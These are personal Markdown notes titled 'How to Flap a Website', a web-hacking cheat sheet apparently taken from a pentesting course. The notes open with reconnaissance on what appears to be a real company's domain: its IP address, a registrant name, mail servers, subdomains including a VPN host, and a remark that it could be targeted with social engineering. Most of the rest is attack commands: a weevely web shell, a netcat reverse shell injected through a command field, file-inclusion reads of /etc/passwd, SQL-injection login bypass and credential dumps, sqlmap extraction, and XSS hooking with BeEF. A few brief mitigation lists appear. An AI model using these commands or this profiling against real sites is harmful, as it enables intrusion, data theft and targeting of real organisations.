
# How to Flap a Website

## Information Gathering
1. Ip address
2. Domain name info
3. Technologies used
4. Other websites on the same server
5. DNS records
6. Unlisted files, sub-domains, directories

[https://whois.domaintools.com/](https://whois.domaintools.com/)
* Register and obtain more results (Traceroute, DNS Lookup)

Registrant: Pedro
IP: 34.197.27.35
**Other websites**
1251capital.com
20mintermsheet.com	
20prom.com


[https://sitereport.netcraft.com/?](https://sitereport.netcraft.com/?)
**Technology**
* Ruby on Rails
* SSL
* Google Analytics & CDN
* JS
* Google Tag Manager (?)
* CSS Media Query

[https://www.robtex.com/](https://www.robtex.com/)
Mail servers **Can do social engeneering**
Fintual.cl has two name servers, five mail servers and four IP numbers.
Google mail.
A Records

#### Bing Search
ip:\<ip>

### Get subdomains
`git clone https://github.com/guelfoweb/knock.git`
`cd knock/knockpy`
`python knock.py fintual.cl`

ayuda.fintual.cl. Server: Cloudflare
blog.fintual.cl
edu.fintual.cl
engineering.fintual.cl
in.fintual.cl
vpn.fintual.cl
www.fintual.cl.herokudns.com. Server: Cowboy

18.218.180.98 **loading ip...**

### Discovering Sensitive Files
`man dirb`
`dirb <domain/ip>`

## Exploitation - File Upload Vulns
`weevely generate <password> <path-to-shell.php>`
`weevely <ip+path-to-shell> <password>`
**Now you have access to the machine**

### Discovering & Exploiting Code Execution Vulns
**Netcat** Listen to network on specific port
`nc -vv -l -p <port>`
Execute command on the input box.
First have to figure out how it's executing it.
`; nc -e /bin/sh <ip> <port>`

### Discovering & Exploiting Local File Inclusion Vulns
Look for variables on the navbar where theres a file included.
We want */etc/passwd*.
Look where included file is located. Count down how many directories to go to /etc/passwd

### Remote File Inclusion Vulns. Configuring PHP Settings
#### Configuring Victim
`sudo nano /etc/php5/cgi/php.ini`
Change 'allow_url_include = On'

Restart webserver
`sudo /etc/init.d/apache2 restart`

**Listen for conection**
`nc -e /bin/sh 10.0.2.15 8080`
#### Executing Netcat on File Inclusion
http://10.0.2.5/dvwa/.../?page=http://localhost/reverse.txt?

### Mitigation
1. Only allow safe files to be uploaded. Don't just check the extension.
2. Avoid the users to run code. If allowing, make sure to filter the text
3.  File inclusion: disable allow_url_fopen & allow_url_include
4. Use static file inclusion

## SQL Injections
### Discovery SQL-I in POST
Using the `and`,`order by` or `'`.

MySQL query. `Select * from accounts where username ='$USERNAME' AND password ='$PSSWD'`
Password input: `123456' and 1=1#`

#### Login with admin account
**Option 1**
username: admin
password: \<whatever\>' or \<code-to-execute\> #

**Option 2**
username: admin' #
password: \<whatever\>

### Discovery SQL-I in GET
Using `order by`.
Hashtag (#) encoded is %23
Use username: `\<whatever\>' order by 100000 #`

Should look like this
http://10.0.2.5/.../?username='gmemin' order by 100000 #&password=...

Since there's probably not 100000 columns, there should be an error.

#### Reading Database Information
Using `order by X`, and vary X to find out how many columns there are in the table (binary search).

Using `union select`.
`union select 1,2,3...,X`
**Showing DB info**
`union select 1,database(),user(),version(),5`

#### Discovering Database Tables
`union select 1,table_name,null...,null,X from information_schema.tables`
optional: `where table_schema = '<database-name>'`

#### Extracting Sensitive Data from Database
**First, get columns**
`union select 1,column_name,null...,null,X from information_schema.columns where table_schema = '<table-name>'`

**Select usernames & passwords**
`union select 1,username,password,is_admin...,null,X from accounts`

### Reading & Writing Files on the Server using SQL-I
**Reading**
`union select null,load_file('/etc/passwd'),null,...,null`

**Writing**
`union select null,'example example',null,...,null into outfile '/var/www/mutillidae/example.txt'`
**If permission error** instead write into /tmp/. Not usefull if can't write to webserver file.

### Exploitation using SQLmap
SQLmap checks for SQL Injections instead of doing it manually.
`sqlmap -u "<url>"`
`sqlmap help`
**Getting databases**
`sqlmap -u "<url>" --dbs`
`sqlmap -u "<url>" --current-user`
`sqlmap -u "<url>" --current-db`
**Tables from a specific Database**
`sqlmap -u "<url>" --tables -D <db-name>`
**Columns of specific table from Database**
`sqlmap -u "<url>" --columns -T <table-name> -D <db-name>`
**Get data from table**
`sqlmap -u "<url>" -T <table-name> -D <db-name> --dump`

### SQL Injection Prevention
**How NOT to do it**
1. Filters. Can be bypassed.
2. Blacklist of commands. Still can be bypassed.
3. White list? Same issue.

**How to do it**
1. Prepare statements and then execute them. PHP has prepare(), execute(). Others programming languages have different methods.
2. In each database, have a single user and should have limited permissions.

## Exploitation - XSS (Cross-Site-Scripting) Vulns
Javascript is executed on the client side.
XSS Types
1. Persistent/Stored XSS
	Code is stored in the database. Every time someone visits the site, it gets executed.
2. Reflected XSS
	Victim runs a website served by the attacker and code is executed.
	It's non persistent and not stored. It will only work when target visits a specially crafted URL.
3. DOM based XSS
	Interpreted and run only in web browser. Doesn't communicate with web server. Could be dangerous because some web servers validate if XSS exist.

### Discovering XSS
*Reflected XSS*
Try to inject any text box or URL with parameters, using `<script>alert("XSS")</script>` syntax, where alert could be any function.

*Stored XSS*
Submitting `<script>code here</script>` into the database. Comments for example (blog).

### Exploiting XSS - Hooking Vulnerable Page Visitors to BeEF
Run BeEF XSS Framework.
The Hook `<script></script>` should be injected in the vulnerable website.
Online Browsers -> Click on target -> Commands Tab -> search for alert -> Execute

### Preventing XSS
*As Server*
1. Minimize untrusted input
2. Escape any untrusted input

*As user*
1. Make sure updates/websites are legit.
2. Check MD5 sum
3. Never trust the web

## Automatically Find Vulns in Web Apps
### Zed Attack Proxy ZAP
Run Zap -> Automated Scan -> Analyze



## Web App Pentesting

## Server Side Attacks

## Client Side Attacks
